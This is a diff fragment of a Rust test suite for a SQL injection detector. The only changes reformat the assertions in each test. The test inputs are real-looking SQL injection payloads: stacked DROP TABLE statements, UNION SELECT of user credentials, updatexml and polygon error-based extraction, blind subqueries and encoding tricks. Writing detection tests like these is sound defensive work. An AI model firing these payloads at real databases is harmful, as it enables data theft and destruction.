+            dets.iter()
+                .any(|d| d.detection_type == "comment_keyword_split")
+        );
     }
 
     #[test]
     fn detect_comment_split_select_with_hash_newline() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("s#x\ne#y\nl#z\ne#k\nc#q\nt 1 from dual");
-        assert!(dets.iter().any(|d| d.detection_type == "comment_keyword_split"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "comment_keyword_split")
+        );
     }
 
     #[test]
     fn detect_unhex_function_abuse() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("SELECT UNHEX('756e696f6e2073656c656374')");
-        assert!(dets.iter().any(|d| d.detection_type == "hex_unicode_function"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "hex_unicode_function")
+        );
     }
 
     #[test]
     fn detect_char_function_abuse() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("SELECT CHAR(85,78,73,79,78,32,83,69,76,69,67,84)");
-        assert!(dets.iter().any(|d| d.detection_type == "hex_unicode_function"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "hex_unicode_function")
+        );
     }
 
     #[test]
     fn detect_unicode_escape_chain_abuse() {
         let eval = SqlStructuralEvaluator;
-        let dets = eval.detect("\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054");
-        assert!(dets.iter().any(|d| d.detection_type == "hex_unicode_function"));
+        let dets = eval.detect(
+            "\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054",
+        );
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "hex_unicode_function")
+        );
     }
 
     #[test]
     fn detect_numeric_dollar_quoted_stacked_payload() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("$1459173$; DROP TABLE users;$1459173$");
-        assert!(dets.iter().any(|d| d.detection_type == "numeric_dollar_quote"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "numeric_dollar_quote")
+        );
     }
 
     #[test]
     fn detect_numeric_dollar_quoted_union_payload() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("$20242026$UNION SELECT user,pass FROM users$20242026$");
-        assert!(dets.iter().any(|d| d.detection_type == "numeric_dollar_quote"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "numeric_dollar_quote")
+        );
     }
 
     #[test]
     fn detect_group_by_subquery_injection() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("GROUP BY (SELECT COUNT(*) FROM users WHERE role='admin')");
-        assert!(dets.iter().any(|d| d.detection_type == "subquery_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "subquery_injection")
+        );
     }
 
     #[test]
     fn detect_like_wildcard_boolean_abuse() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("' OR username LIKE '%admin%' --");
-        assert!(dets.iter().any(|d| d.detection_type == "like_wildcard_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "like_wildcard_injection")
+        );
     }
 
     #[test]
     fn detect_like_wildcard_where_abuse() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("WHERE email LIKE '%@corp.com' AND 1=1");
-        assert!(dets.iter().any(|d| d.detection_type == "like_wildcard_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "like_wildcard_injection")
+        );
     }
 
     #[test]
     fn detect_mssql_stacked_variant_declare() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("1; DECLARE @x INT; SELECT @x");
-        assert!(dets.iter().any(|d| d.detection_type == "dbms_stacked_variant"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "dbms_stacked_variant")
+        );
     }
 
     #[test]
     fn detect_oracle_plsql_stacked_variant() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;");
-        assert!(dets.iter().any(|d| d.detection_type == "dbms_stacked_variant"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "dbms_stacked_variant")
+        );
     }
 
     #[test]
     fn detect_mysql_stacked_set_session_variant() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("1; SET @x = (SELECT user())");
-        assert!(dets.iter().any(|d| d.detection_type == "dbms_stacked_variant"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "dbms_stacked_variant")
+        );
     }
 
     #[test]
     fn detect_boolean_blind_count_subquery() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("AND 1=(SELECT COUNT(*) FROM users WHERE role='admin')");
-        assert!(dets.iter().any(|d| d.detection_type == "boolean_blind_subquery"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "boolean_blind_subquery")
+        );
     }
 
     #[test]
     fn detect_boolean_blind_exists_subquery() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("OR EXISTS(SELECT 1 FROM users WHERE id=1)");
-        assert!(dets.iter().any(|d| d.detection_type == "boolean_blind_subquery"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "boolean_blind_subquery")
+        );
     }
 
     #[test]
     fn detect_advanced_error_polygon_payload() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("AND polygon((SELECT CONCAT(0x7e,version(),0x7e)))");
-        assert!(dets.iter().any(|d| d.detection_type == "advanced_error_oracle"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "advanced_error_oracle")
+        );
     }
 
     #[test]
     fn detect_advanced_error_updatexml_payload() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)");
-        assert!(dets.iter().any(|d| d.detection_type == "advanced_error_oracle"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "advanced_error_oracle")
+        );
     }
 
     #[test]
@@ -2541,21 +2957,33 @@ mod tests {
     #[test]
     fn detect_insert_on_duplicate_key_injection() {
         let eval = SqlStructuralEvaluator;
-        let dets = eval.detect("INSERT INTO users(id,name) VALUES(1,'a') ON DUPLICATE KEY UPDATE role='admin'");
-        assert!(dets.iter().any(|d| d.detection_type == "insert_update_injection"));
+        let dets = eval.detect(
+            "INSERT INTO users(id,name) VALUES(1,'a') ON DUPLICATE KEY UPDATE role='admin'",
+        );
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "insert_update_injection")
+        );
     }
 
     #[test]
     fn detect_update_set_subquery_injection() {
         let eval = SqlStructuralEvaluator;
-        let dets = eval.detect("UPDATE users SET role=(SELECT password FROM users LIMIT 1) WHERE id=1");
-        assert!(dets.iter().any(|d| d.detection_type == "insert_update_injection"));
+        let dets =
+            eval.detect("UPDATE users SET role=(SELECT password FROM users LIMIT 1) WHERE id=1");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "insert_update_injection")
+        );
     }
 
     #[test]
     fn detect_insert_select_injection_pattern() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("INSERT INTO archive SELECT username,password FROM users");
-        assert!(dets.iter().any(|d| d.detection_type == "insert_update_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "insert_update_injection")
+        );
     }
 }
